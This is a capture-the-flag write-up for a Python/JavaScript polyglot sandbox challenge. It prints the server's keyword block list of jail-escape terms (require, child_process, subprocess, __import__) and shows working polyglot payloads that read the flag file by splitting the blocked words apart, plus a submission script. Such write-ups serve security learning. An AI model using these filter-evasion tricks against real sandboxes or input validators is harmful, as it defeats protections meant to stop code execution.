---
description: 'Solved by: Ryo Soikutsu'
---

# PyJsJail

## Challenge Description

```
Welcome to the Polyglot jail.

Can you find a way to break out of the jail?
```

Category: Misc (Unrated)

## Walkthrough

We are provided a zip file containing the following files

* A sample flag.txt file
* A Dockerfile
* The server script (server.py)

The server script is as follows

<details>

<summary>Server script (server.py)</summary>

<pre class="language-python"><code class="lang-python"><strong># server.py
</strong>import subprocess
import tempfile
import os
from flask import Flask, request, jsonify
import re 

app = Flask(__name__)

FLAG = open("flag.txt").read().strip()

@app.route("/challenge", methods=["POST"])
def challenge():
    payload = request.json.get("payload", "")

    results = {}
    interpreters = {
        "python": ["python3", "-c", payload],
        "javascript": ["node", "-e", payload]
    }

    for lang, cmd in interpreters.items():
        try:
            BLOCKED_KEYWORDS = [
                    "require",
                    "process",
                    "child_process",
                    "Function",
                    "constructor",
                    "globalThis",
                    "module",
                    "exports",
                    "Buffer",
                    "__proto__",
                    "Reflect",
                    "Object",
                    "`",
                    "flat",
                    "map",
                    "filter",
                    "constructor",
                    "toString",
                    "call",
                    "apply",
                    "bind",
                    "new",
                    #
                    "import",
                    "open",
                    "os",
                    "system",
                    "subprocess",
                    "input",
                    "flag",
                    "console",
                    "require",
                    "__import__",
                    "__builtins__"
            ]

            BLOCK_PATTERN = re.compile(r"|".join([fr"\b{kw}\b" for kw in BLOCKED_KEYWORDS]), re.IGNORECASE)
            if BLOCK_PATTERN.search(payload):
                return jsonify({"error": "Blocked keyword detected."}), 403

            print("Testing the following command: \n{}".format(cmd))
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)

            output = result.stdout.decode().strip()
            print(output)
            if FLAG in output:
                results[lang] = f"SUCCESS"
            else:
                results[lang] = f"FAILURE"
                return  jsonify(results)
        except Exception as e:
            results[lang] = f"Error!"
            return  jsonify(results)
    else : 
        results['flag'] = FLAG 

    return jsonify(results)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)


</code></pre>



</details>

There are a couple of interesting features about the server script provided

### Server script breakdown

Starting off, we can see the very long list of blacklisted words

```python
    for lang, cmd in interpreters.items():
        try:
            BLOCKED_KEYWORDS = [
                    "require",
                    "process",
                    "child_process",
                    "Function",
                    "constructor",
                    "globalThis",
                    "module",
                    "exports",
                    "Buffer",
                    "__proto__",
                    "Reflect",
                    "Object",
                    "`",
                    "flat",
                    "map",
                    "filter",
                    "constructor",
                    "toString",
                    "call",
                    "apply",
                    "bind",
                    "new",
                    #
                    "import",
                    "open",
                    "os",
                    "system",
                    "subprocess",
                    "input",
                    "flag",
                    "console",
                    "require",
                    "__import__",
                    "__builtins__"
            ]
            ...
```

The following block of code defines a list of common keywords and dunder methods used to escape Python jails (aka "pyjails"). It checks the provided payload to ensure that it does not contain any blacklisted characters

At the top, there is a small chunk of code defining two different interpreters used to execute the payload provided

```python
@app.route("/challenge", methods=["POST"])
def challenge():
    payload = request.json.get("payload", "")

    results = {}
    interpreters = {
        "python": ["python3", "-c", payload],
        "javascript": ["node", "-e", payload]
    }
    ...
```

This code defines a Python and Javascript (Node.js) interpreter, and executes them using the same payload as an argument

The blacklist list is used with this block of code, which will validate with regex and return an error if it detects any blacklisted words

```python
            BLOCK_PATTERN = re.compile(r"|".join([fr"\b{kw}\b" for kw in BLOCKED_KEYWORDS]), re.IGNORECASE)
            if BLOCK_PATTERN.search(payload):
                return jsonify({"error": "Blocked keyword detected."}), 403
```

Finally, the interpreter commands are executed using the Python subprocess library, and checked if the output contains the flag

```python
            print("Testing the following command: \n{}".format(cmd))
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=3)

            output = result.stdout.decode().strip()
            print(output)
            if FLAG in output:
                results[lang] = f"SUCCESS"
            else:
                results[lang] = f"FAILURE"
                return  jsonify(results)
```

If the Python and Javascript interpreters return success, the flag will be inserted into the final output and returned

### Back to the walkthrough

As implied by the challenge description, we need to use a polyglot program to exploit this program. In simple terms, a polyglot code is simply a program that can be executed in two or more different languages, and returns the same output for each.&#x20;

The following video is a good introductory example of what a polyglot program is like, and how to write a basic polyglot program (link [here](https://youtu.be/dbf9e7okjm8?si=PolqifCrUp7iXyIN))

It took a bit of experimentation (like, 2 hours), but I managed to come up with a suitable Python payload that will trigger a success response

```python
exec("var='fla'+'g.txt';exec('print(op{}(var).read())'.format('en'))")
```

(Note: This was before I realized the polyglot hint, so I thought it was just Python)

The following program runs the <mark style="color:red;">`exec`</mark> function, and executes the following

* Create a variable <mark style="color:red;">`var`</mark> and sets its value to "flag.txt"&#x20;
* Another <mark style="color:red;">`exec`</mark> function is called, which calls the <mark style="color:red;">`open`</mark> function to read the flag file, and outputs it

Some of the code is fragmented, such as the flag.txt string and the open keywords. This is to prevent the server from detecting the blacklisted keywords, and exiting before the code is ran

Later when I realized about the polyglot hint, I modified the code to the following

```python
1 // (lambda:exec("var='fla'+'g.txt';exec('print(op{}(var).read())'.format('en'))") or 1)()
```

The Javascript section was harder, since I have not written Javascript before. As such, I enlisted the help of our lord and savior, ChatGPT

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

It took an hour or two of additional prompting, personal research and banging my head against the table before finding a suitable JS payload

```javascript
lambda:eval('const fs=require(\"fs\");process.stdout.write(fs.readFileSync(\"flag.txt\",\"utf8\"))')
```

Unfortunately, the version of Node.js used by my machine and the version used by the challenge was different (v20.15.0 for my machine vs v10.19.0 on the challenge machine). As such, some features such as fs does not exist.&#x20;

_sighhhh_ More ChatGPT time!

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption><p>Threw in the full error message because Im lazy :P</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Fortunately, the second exploit given was just enough to run on the challenge. After some modification to the output code, we are left with the following

```javascript
1 // (lambda:exec("var='fla'+'g.txt';exec('print(op{}(var).read())'.format('en'))") or 1)()
lambda:eval('const fs=requ'+'ire(\"fs\");pro'+'cess.stdout.write(fs.readFileSync(\"fla'+'g.txt\",\"utf8\"))')
```

Finally, we can pass this exploit to the challenge server using the following (also ChatGPT'd, because I was lazy) script

```python
#!/usr/bin/env python3
import sys
import json
import requests

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <polyglot-file> <target-url>")
        sys.exit(1)

    polyglot_path = sys.argv[1]
    url = sys.argv[2]

    # 1. Read the entire polyglot file
    with open(polyglot_path, 'r', encoding='utf-8') as f:
        code = f.read()

    # 2. Build the JSON payload
    payload = {
        "payload": code
    }

    # 3. Send it as application/json
    headers = {
        "Content-Type": "application/json"
    }
    print(payload)
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"❌ Error sending request: {e}")
        sys.exit(2)

    # 4. Print response
    print(f"✅ {resp.status_code} {resp.reason}")
    print(resp.text)

if __name__ == "__main__":
    main()

```

Finally, we can attempt to query the remote server to get the flag

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption><p>Solved with 10 minutes to spare</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/WhatsApp Image 2025-06-11 at 17.19.58_d8309629.jpg" alt=""><figcaption></figcaption></figure>

### How the exploit works

Earlier, we glossed through over how the exploit works, so now we'll go through in depth with it. We'll start with the Python code, then the Javascript code, then the polyglot code in all

As a reminder, this is our code

```python
1 // (lambda:exec("var='fla'+'g.txt';exec('print(op{}(var).read())'.format('en'))") or 1)()
lambda:eval('const fs=requ'+'ire(\"fs\");pro'+'cess.stdout.write(fs.readFileSync(\"fla'+'g.txt\",\"utf8\"))')
```

As explained earlier, the Python code attempts to read the flag file using an indirect method—first defining a variable that represents the file, then reading its contents. The JavaScript code follows a similar logic: it imports the `fs` (filesystem) module, spawns a standard output process, and writes the contents of the flag file to the terminal.

Now, onto the polyglot code. This code cleverly manipulates syntax so that it appears as a valid, but different, program to each interpreter. When run with the Python interpreter, it attempts to divide 1 by the Boolean result of a lambda function or simply by 1, followed by another lambda that evaluates JavaScript code. Conversely, when interpreted by a JavaScript engine, it treats the `lambda` keyword as a label—effectively a no-op—and proceeds to execute an `eval` statement.

This duality leads to an interesting visualization when viewed through JavaScript vs Python syntax highlighters, where each highlights different parts of the code based on their own parsing logic.

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption><p>Comparison in two different linters</p></figcaption></figure>

### Added Notes

* I originally thought that the challenge was a command injection exploit, since our inputs was directly inserted and executed by the server. However, that proved to be unsuccessful
* I went through about 10-15 different iterations of the Python payload, since I originally thought that it was a traditional PyJail challenge

## Conclusion

Overall, I found this to be a pretty interesting challenge. It seemed quite unique compared to other pyjail challenges, and really tested my knowledge of programming. I learnt about polyglot programming, and how to take advantage of the unique properties of different languages.&#x20;
